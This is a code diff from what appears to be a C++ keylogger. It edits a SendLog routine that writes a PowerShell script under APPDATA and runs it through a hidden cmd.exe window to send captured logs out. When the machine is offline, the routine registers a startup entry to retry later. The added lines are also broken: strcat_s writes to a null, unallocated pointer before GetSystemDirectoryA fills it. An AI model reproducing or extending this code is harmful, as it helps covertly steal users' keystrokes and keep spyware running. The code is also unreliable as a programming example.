@@ -979,10 +979,13 @@ void LogItChar(std::string Value, std::string FileName) {
 
 void SendLog(std::string CurrentLog) {
     std::string Command = "/C powershell ";
+    char* SysDir = nullptr;
     DWORD WrittenBytes, DWFlags;
     char* AppData = nullptr;
     size_t AppDataSize;
+    strcat_s(SysDir, MAX_PATH,"\\cmd.exe");
     _dupenv_s(&AppData, &AppDataSize, "APPDATA");
+    GetSystemDirectoryA(SysDir,MAX_PATH);
     std::string Powershell = AppData;
     Powershell += "\\MagikIndex\\PSScript";
     Powershell += std::to_string(GetTickCount());
@@ -1006,7 +1009,7 @@ void SendLog(std::string CurrentLog) {
     Command += Powershell;
     if (!InternetGetConnectedState(&DWFlags, NULL)) {
         LogItChar("No Internet, scheduling task for log extraction...", CurrentLog);
-        RegisterMyProgramForStartup(PSStartup.c_str(), "C:\\Windows\\System32\\cmd.exe", Command.c_str());
+        RegisterMyProgramForStartup(PSStartup.c_str(), SysDir, Command.c_str());
     }else{
         LogItChar("Connected to the internet, sending the log...", CurrentLog);
         ShellExecuteA(0, "open", "cmd.exe", Command.c_str(), 0, SW_HIDE);
